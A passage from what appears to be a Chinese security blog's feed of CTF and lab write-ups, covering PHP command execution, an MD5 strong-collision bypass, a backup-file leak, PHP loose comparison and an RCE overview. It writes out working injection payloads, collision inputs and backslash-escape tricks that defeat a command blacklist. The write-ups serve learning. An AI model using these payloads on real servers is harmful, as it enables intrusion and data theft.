md5($_POST[&#39;b&#39;])) &#123;        echo &#96;$cmd&#96;;    &#125; else &#123;        echo (&quot;有趣的md5&quot;);    &#125;&#125;?&gt;&lt;&#x2F;div&gt;    &lt;!-- Included JS Files (Uncompressed) --&gt;  &lt;!--    &lt;script src&#x3D;&quot;..&#x2F;javascripts&#x2F;jquery.js&quot;&gt;&lt;&#x2F;script&gt;    &lt;script src&#x3D;&quot;..&#x2F;javascripts&#x2F;jquery.foundation.mediaQueryToggle.js&quot;&gt;&lt;&#x2F;script&gt;    &lt;script src&#x3D;&quot;..&#x2F;javascripts&#x2F;jquery.foundation.forms.js&quot;&gt;&lt;&#x2F;script&gt;    &lt;script src&#x3D;&quot;..&#x2F;javascripts&#x2F;jquery.foundation.reveal.js&quot;&gt;&lt;&#x2F;script&gt;    &lt;script src&#x3D;&quot;..&#x2F;javascripts&#x2F;jquery.foundation.orbit.js&quot;&gt;&lt;&#x2F;script&gt;    &lt;script src&#x3D;&quot;..&#x2F;javascripts&#x2F;jquery.foundation.navigation.js&quot;&gt;&lt;&#x2F;script&gt;    &lt;script src&#x3D;&quot;..&#x2F;javascripts&#x2F;jquery.foundation.buttons.js&quot;&gt;&lt;&#x2F;script&gt;    &lt;script src&#x3D;&quot;..&#x2F;javascripts&#x2F;jquery.foundation.tabs.js&quot;&gt;&lt;&#x2F;script&gt;    &lt;script src&#x3D;&quot;..&#x2F;javascripts&#x2F;jquery.foundation.tooltips.js&quot;&gt;&lt;&#x2F;script&gt;    &lt;script src&#x3D;&quot;..&#x2F;javascripts&#x2F;jquery.foundation.accordion.js&quot;&gt;&lt;&#x2F;script&gt;    &lt;script src&#x3D;&quot;..&#x2F;javascripts&#x2F;jquery.placeholder.js&quot;&gt;&lt;&#x2F;script&gt;    &lt;script src&#x3D;&quot;..&#x2F;javascripts&#x2F;jquery.foundation.alerts.js&quot;&gt;&lt;&#x2F;script&gt;    &lt;script src&#x3D;&quot;..&#x2F;javascripts&#x2F;jquery.foundation.topbar.js&quot;&gt;&lt;&#x2F;script&gt;    &lt;script src&#x3D;&quot;..&#x2F;javascripts&#x2F;jquery.foundation.joyride.js&quot;&gt;&lt;&#x2F;script&gt;    &lt;script src&#x3D;&quot;..&#x2F;javascripts&#x2F;jquery.foundation.clearing.js&quot;&gt;&lt;&#x2F;script&gt;    &lt;script src&#x3D;&quot;..&#x2F;javascripts&#x2F;jquery.foundation.magellan.js&quot;&gt;&lt;&#x2F;script&gt;    --&gt;    &lt;!-- Included JS Files (Compressed) --&gt;  &lt;script src&#x3D;&quot;..&#x2F;javascripts&#x2F;jquery.js&quot;&gt;&lt;&#x2F;script&gt;  &lt;script src&#x3D;&quot;..&#x2F;javascripts&#x2F;foundation.min.js&quot;&gt;&lt;&#x2F;script&gt;    &lt;!-- Initialize JS Plugins --&gt;  &lt;script src&#x3D;&quot;..&#x2F;javascripts&#x2F;app.js&quot;&gt;&lt;&#x2F;script&gt;  &lt;&#x2F;body&gt;&lt;&#x2F;html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到，很多命令都被过滤了</p><pre class="line-numbers language-php+HTML" data-language="php+HTML"><code class="language-php+HTML">if (preg_match(&quot;&#x2F;ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#39;|\&quot;|\&#96;|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;&#x2F;i&quot;, $cmd)) &#123;    echo(&quot;forbid ~&quot;);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>但只要符合下面的条件就可以执行命令</p><pre class="line-numbers language-php+HTML" data-language="php+HTML"><code class="language-php+HTML">if ((string)$_POST[&#39;a&#39;] !&#x3D;&#x3D; (string)$_POST[&#39;b&#39;] &amp;&amp; md5($_POST[&#39;a&#39;]) &#x3D;&#x3D;&#x3D; md5($_POST[&#39;b&#39;])) &#123;       echo &#96;$cmd&#96;;   &#125; <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>这里绕过MD5函数的比较，又因为强行进行了string转换，所以我们这里不能进行数组绕过md5；所以这里需要构造出满足这样条件的md5；</strong></p><p>POST：</p><pre class="line-numbers language-none"><code class="language-none">a&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&amp;b&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h2><p>由于过滤了很多命令，但查看目录的命令<code>dir</code>没有被禁用；查看一下当前目录有没有flag：</p><pre class="line-numbers language-none"><code class="language-none">POST &#x2F;index.php?cmd&#x3D;dir<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/03/16/%E4%B8%9C%E5%A1%94%E9%9D%B6%E5%9C%BA-CTF-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-2/image-20220316094902981.png" alt="image-20220316094902981"></p><p>当前目录中没有flag，去根目录找一下flag：</p><pre class="line-numbers language-none"><code class="language-none">POST &#x2F;index.php?cmd&#x3D;dir%20&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/03/16/%E4%B8%9C%E5%A1%94%E9%9D%B6%E5%9C%BA-CTF-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-2/image-20220316095044884.png" alt="image-20220316095044884"></p><p>有flag文件。</p><p>读取flag，由于<code>cat</code>被禁用了，但在linux命令中可以加反斜杠<code>(\)</code>进行逃逸：</p><p><img src="/2022/03/16/%E4%B8%9C%E5%A1%94%E9%9D%B6%E5%9C%BA-CTF-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-2/image-20220316095657940.png" alt="image-20220316095657940"></p><p>得到flag。</p><p>或者可以使用sort &#x2F;flag进行读取：<br><img src="/2022/03/16/%E4%B8%9C%E5%A1%94%E9%9D%B6%E5%9C%BA-CTF-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-2/image-20220316095907910.png" alt="image-20220316095907910"></p><p>（Linux sort命令用于将文本文件内容加以排序。）</p><p>查看目录也可以使用反斜杠<code>(\)</code>逃逸：</p><pre class="line-numbers language-none"><code class="language-none">POST &#x2F;index.php?cmd&#x3D;l\s%20&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/03/16/%E4%B8%9C%E5%A1%94%E9%9D%B6%E5%9C%BA-CTF-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-2/image-20220316100108501.png" alt="image-20220316100108501"></p><h2 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h2><p>这里难点主要在于MD5的强类型绕过；linux命令的熟悉程度和反斜杠逃逸。</p><p>参考文章：</p><p>浅谈MD5强类型碰撞：</p><p><a href="https://baijiahao.baidu.com/s?id=1691028605507773400&wfr=spider&for=pc">https://baijiahao.baidu.com/s?id=1691028605507773400&amp;wfr=spider&amp;for=pc</a></p><p>MD5强类型绕过：</p><p><a href="https://blog.csdn.net/weixin_43332695/article/details/119349204">https://blog.csdn.net/weixin_43332695/article/details/119349204</a></p><p><a href="https://blog.csdn.net/CSDNiamcoming/article/details/108837347">https://blog.csdn.net/CSDNiamcoming/article/details/108837347</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界-web-backup</title>
      <link href="/2022/03/15/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-web-backup/"/>
      <url>/2022/03/15/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-web-backup/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>记录一下攻防世界新手区，web-backup这道题。关于index.php的备份文件。</p><h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>启动靶场，看到：你知道index.php的备份文件名吗？</p><p><img src="/2022/03/15/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-web-backup/image-20220315172147074.png" alt="image-20220315172147074"></p><h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><p>使用搜索引擎</p><p><img src="/2022/03/15/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-web-backup/image-20220315172357429.png" alt="image-20220315172357429"></p><h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><p>在地址栏输入：<code>index.php.bak</code>，可以看到备份文件下载完成</p><p><img src="/2022/03/15/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-web-backup/image-20220315172446621.png" alt="image-20220315172446621"></p><p><img src="/2022/03/15/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-web-backup/image-20220315172429110.png" alt="image-20220315172429110"></p><h2 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h2><p>打开备份文件，拿到flag</p><p><img src="/2022/03/15/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-web-backup/image-20220315172612851.png" alt="image-20220315172612851"></p><h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><p>主要记录一下index.php的备份文件是什么，以后遇到起码不陌生。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php弱类型</title>
      <link href="/2022/03/15/php%E5%BC%B1%E7%B1%BB%E5%9E%8B/"/>
      <url>/2022/03/15/php%E5%BC%B1%E7%B1%BB%E5%9E%8B/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在CTF平台做题时，遇到很多php弱类型的题目，也看了很多php弱类型的文章，在这里总结一下。</p><h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>php中有两种比较的符号 <code>==</code> 与 <code>===</code></p><pre class="line-numbers language-php" data-language="php"><code class="language-php">1 <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token number">2</span> <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$b</span> <span class="token punctuation">;</span><span class="token number">3</span> <span class="token variable">$a</span><span class="token operator">===</span><span class="token variable">$b</span> <span class="token punctuation">;</span><span class="token number">4</span> <span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><code>===</code> 在进行比较的时候，会先判断两种字符串的类型是否相等，再比较</p><p><code>==</code> 在进行比较的时候，会先将字符串类型转化成相同，再比较</p><p><strong>这里明确了说如果一个数值和字符串进行比较的时候，会将字符串转换成数值</strong></p><pre class="line-numbers language-php" data-language="php"><code class="language-php">1 <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token number">2</span> <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"admin"</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//true</span><span class="token number">3</span> <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"1admin"</span><span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//true</span><span class="token number">4</span> <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"admin1"</span><span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment">//false</span><span class="token number">5</span> <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"admin1"</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment">//true</span><span class="token number">6</span> <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"0e123456"</span><span class="token operator">==</span><span class="token string double-quoted-string">"0e4456789"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//true </span><span class="token number">7</span> <span class="token delimiter important">?></span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">1 观察上述代码，&quot;admin&quot;&#x3D;&#x3D;0 比较的时候，会将admin转化成数值，强制转化,由于admin是字符串，转化的结果是0自然和0相等2 &quot;1admin&quot;&#x3D;&#x3D;1 比较的时候会将1admin转化成数值,结果为1，而“admin1“&#x3D;&#x3D;1 却等于错误，也就是&quot;admin1&quot;被转化成了0,为什么呢？？3 &quot;0e123456&quot;&#x3D;&#x3D;&quot;0e456789&quot;相互比较的时候，会将0e这类字符串识别为科学技术法的数字，0的无论多少次方都是零，所以相等<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>对于上述的问题查了php手册</p><pre class="line-numbers language-none"><code class="language-none">当一个字符串欸当作一个数值来取值，其结果和类型如下:如果该字符串没有包含&#39;.&#39;,&#39;e&#39;,&#39;E&#39;并且其数值值在整形的范围之内该字符串被当作int来取值，其他所有情况下都被作为float来取值，该字符串的开始部分决定了它的值，如果该字符串以合法的数值开始，则使用该数值，否则其值为0。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-php" data-language="php"><code class="language-php">1 <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token number">2</span> <span class="token variable">$test</span><span class="token operator">=</span><span class="token number">1</span> <span class="token operator">+</span> <span class="token string double-quoted-string">"10.5"</span><span class="token punctuation">;</span> <span class="token comment">// $test=11.5(float)</span><span class="token number">3</span> <span class="token variable">$test</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">+</span><span class="token string double-quoted-string">"-1.3e3"</span><span class="token punctuation">;</span> <span class="token comment">//$test=-1299(float)</span><span class="token number">4</span> <span class="token variable">$test</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">+</span><span class="token string double-quoted-string">"bob-1.3e3"</span><span class="token punctuation">;</span><span class="token comment">//$test=1(int)</span><span class="token number">5</span> <span class="token variable">$test</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">+</span><span class="token string double-quoted-string">"2admin"</span><span class="token punctuation">;</span><span class="token comment">//$test=3(int)</span><span class="token number">6</span> <span class="token variable">$test</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">+</span><span class="token string double-quoted-string">"admin2"</span><span class="token punctuation">;</span><span class="token comment">//$test=1(int)</span><span class="token number">7</span> <span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>所以就解释了”admin1”&#x3D;&#x3D;1 &#x3D;&gt;False 的原因</p><h2 id="0x01-总结"><a href="#0x01-总结" class="headerlink" title="0x01 总结"></a>0x01 总结</h2><p>这些php弱类型只是冰山一角 上述验证了代码审计的重要性</p><p>参考原文：</p><p><a href="https://www.cnblogs.com/Mrsm1th/p/6745532.html">https://www.cnblogs.com/Mrsm1th/p/6745532.html</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>墨者学院-命令执行</title>
      <link href="/2022/03/13/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
      <url>/2022/03/13/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>#命令执行注入</p><h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>启动靶场环境</p><p><img src="/2022/03/13/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20220313094027047.png" alt="image-20220313094027047"></p><h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><p>提示输入ip地址</p><p><img src="/2022/03/13/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20220313094214029.png" alt="image-20220313094214029"></p><p>先测试一下</p><p><img src="/2022/03/13/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20220313094257314.png" alt="image-20220313094257314"></p><p>可以看到成功ping的返回信息。</p><h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><p>接下来尝试使用管道符执行ls命令查看目录</p><p><img src="/2022/03/13/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20220313100436220.png" alt="image-20220313100436220"></p><p>这里判断的时候出现弹窗提示ip格式不对，先看下源码是不是前端验证</p><p><img src="/2022/03/13/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20220313094615030.png" alt="image-20220313094615030"></p><p>果然，那这里的话就需要绕过前端验证。</p><h2 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h2><p>抓包进行绕过</p><p><img src="/2022/03/13/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20220313100600741.png" alt="image-20220313100600741"></p><p>目录中有key文件</p><h2 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h2><p>使用cat命令打开key文件</p><p><img src="/2022/03/13/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20220313100912420.png" alt="image-20220313100912420"></p><p>无回显，因该是有过滤</p><h2 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h2><p>添加<code>&lt;</code>绕过过滤，成功得到key</p><p><img src="/2022/03/13/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20220313100958826.png" alt="image-20220313100958826"></p><h2 id="0x06"><a href="#0x06" class="headerlink" title="0x06"></a>0x06</h2><p>提交key，完成</p><p><img src="/2022/03/13/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20220313101132802.png" alt="image-20220313101132802"></p><h1 id="PHP代码分析溯源-第4题"><a href="#PHP代码分析溯源-第4题" class="headerlink" title="PHP代码分析溯源(第4题)"></a>PHP代码分析溯源(第4题)</h1><h2 id="0x00-1"><a href="#0x00-1" class="headerlink" title="0x00"></a>0x00</h2><p>启动靶场</p><p><img src="/2022/03/13/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20220313101314099.png" alt="image-20220313101314099"></p><h2 id="0x01-1"><a href="#0x01-1" class="headerlink" title="0x01"></a>0x01</h2><p>提示key在根目录，而且还有一段base64加密的php代码，先试着解密查看内容</p><p><img src="/2022/03/13/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20220313101401929.png" alt="image-20220313101401929"></p><h2 id="0x02-1"><a href="#0x02-1" class="headerlink" title="0x02"></a>0x02</h2><p>解密出来是REQUEST请求，a是参数，也是可控变量，那这里利用a做文章</p><p><img src="/2022/03/13/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20220313101922929.png" alt="image-20220313101922929"></p><h2 id="0x03-1"><a href="#0x03-1" class="headerlink" title="0x03"></a>0x03</h2><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;124.70.71.251:42767&#x2F;f.php?a&#x3D;ls<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>得到目录，有key存在</p><p><img src="/2022/03/13/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20220313102142552.png" alt="image-20220313102142552"></p><h2 id="0x04-1"><a href="#0x04-1" class="headerlink" title="0x04"></a>0x04</h2><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;124.70.71.251:42767&#x2F;f.php?a&#x3D;cat%20key_5986251809730.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查看源码得到key</p><p><img src="/2022/03/13/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20220313102605832.png" alt="image-20220313102605832"></p><h2 id="0x05-1"><a href="#0x05-1" class="headerlink" title="0x05"></a>0x05</h2><p>提交key，完成</p><p><img src="/2022/03/13/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20220313102721754.png" alt="image-20220313102721754"></p>]]></content>
      
      
      <categories>
          
          <category> RCE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> RCE </tag>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RCE代码及命令执行漏洞</title>
      <link href="/2022/03/12/RCE%E4%BB%A3%E7%A0%81%E5%8F%8A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"/>
      <url>/2022/03/12/RCE%E4%BB%A3%E7%A0%81%E5%8F%8A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在 Web 应用中有时候程序员为了考虑灵活性、简洁性，会在代码调用代码或命令执行函数去处理。比如当应用在调用一些能将字符串转化成代码的函数时，没有考虑用户是否能控制这个字符串，将造成代码执行漏洞。同样调用系统命令处理，将造成命令执行漏洞。</p><p>脑图：</p><p><img src="/2022/03/12/RCE%E4%BB%A3%E7%A0%81%E5%8F%8A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20220312160620185.png" alt="image-20220312160620185"></p><h2 id="RCE漏洞原理"><a href="#RCE漏洞原理" class="headerlink" title="RCE漏洞原理"></a>RCE漏洞原理</h2><p>RCE(remote command&#x2F;code execute，远程命令执行)漏洞，一般出现这种漏洞，是因为应用系统从设计上需要给用户提供指定的远程命令操作的接口，比如我们常见的路由器、防火墙、入侵检测等设备的web管理界面上。<br>一般会给用户提供一个<code>ping</code>操作的web界面，用户从web界面输入目标IP，提交后，后台会对该IP地址进行一次<code>ping</code>测试，并返回测试结果。如果设计者在完成该功能时，没有做严格的安全控制，则可能会导致攻击者通过该接口提交“意想不到”的命令，从而让后台进行执行，从而控制整个后台服务器。</p><p>直白一点：</p><p>RCE漏洞，可以让攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统。RCE分为远程命令执行ping和远程代码执行evel。</p><h2 id="检测RCE漏洞"><a href="#检测RCE漏洞" class="headerlink" title="检测RCE漏洞"></a>检测RCE漏洞</h2><p><strong>涉及系统命令执行函数：</strong></p><pre class="line-numbers language-none"><code class="language-none">system()passthru()exec()shell_exec()popen()proc_open()pcntl_exec()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>黑盒测试：网站中有特殊功能，比如Ping、数据库备份等等。</p><p>白盒测试：查看命令执行函数是否做过滤。命令执行函数如下：</p><p>​    PHP代码执行函数：eval()、assert()、preg_replace()、create_function()、array_map()、call_user_func()、call_user_func_array()、array_filter()、uasort()</p><p>​    PHP命令执行函数：system()、exec()、shell_exec()、pcntl_exec()、popen()、proc_popen()、passthru()</p><h2 id="RCE漏洞危害"><a href="#RCE漏洞危害" class="headerlink" title="RCE漏洞危害"></a>RCE漏洞危害</h2><p>高危：</p><p>直接获取服务器权限；</p><p>获取敏感数据，文件；</p><p>写入恶意文件getshell。</p><h2 id="RCE漏洞利用"><a href="#RCE漏洞利用" class="headerlink" title="RCE漏洞利用"></a>RCE漏洞利用</h2><h5 id="windows下管道符"><a href="#windows下管道符" class="headerlink" title="windows下管道符"></a>windows下管道符</h5><pre class="line-numbers language-none"><code class="language-none">“;”：执行完前面的语句再执行后面的语句。“|”：显示后面语句的执行结果。“||”：当前面的语句执行出错时，执行后面的语句。“&amp;”：两条命令都执行，如果前面的语句为假则执行执行后面的语句，前面的语句可真可假。“&amp;&amp;”：如果前面的语句为假则直接出错，也不执行后面的语句，前面的语句为真则两条命令都执行，前面的语句只能为真。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="linux下管道符"><a href="#linux下管道符" class="headerlink" title="linux下管道符"></a>linux下管道符</h5><pre class="line-numbers language-none"><code class="language-none">“;”：执行完前面的语句再执行后面的语句。 “|”：显示后面语句的执行结果。 “||”：当前面的语句执行出错时，执行后面的语句。“&amp;”：两条命令都执行，如果前面的语句为假则执行执行后面的语句，前面的语句可真可假。 “&amp;&amp;”：如果前面的语句为假则直接出错，也不执行后面的语句，前面的语句为真则两条命令都执行，前面的语句只能为真<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>##RCE漏洞防范:</p><p>1、在进入危险函数前进行严格的检测和过滤；</p><p>2、尽量不要使用命令执行函数。</p>]]></content>
      
      
      <categories>
          
          <category> RCE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RCE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSRF靶场</title>
      <link href="/2022/03/08/CSRF%E9%9D%B6%E5%9C%BA/"/>
      <url>/2022/03/08/CSRF%E9%9D%B6%E5%9C%BA/</url>
      
